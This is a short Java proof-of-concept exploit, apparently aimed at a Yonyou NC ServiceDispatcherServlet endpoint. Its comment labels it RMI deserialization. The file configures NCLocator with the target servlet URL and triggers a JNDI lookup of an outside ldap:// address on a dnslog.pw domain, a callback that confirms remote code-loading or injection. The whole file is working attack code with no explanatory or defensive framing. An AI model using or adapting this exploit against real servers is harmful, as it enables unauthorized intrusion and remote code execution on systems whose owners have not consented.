package exp;

import nc.bs.framework.common.NCLocator;
import java.util.Properties;

//RMI反序列化
public class JNDI_ServiceDispatcherServlet {
    public static void main(String[] args) throws Exception {
        Properties env = new Properties();
        env.put("SERVICEDISPATCH_URL", "http://192.168.111.154:8088/ServiceDispatcherServlet");
        NCLocator locator = NCLocator.getInstance(env);
        locator.lookup("ldap://123123.j1n34lgn.dnslog.pw");
    }
}
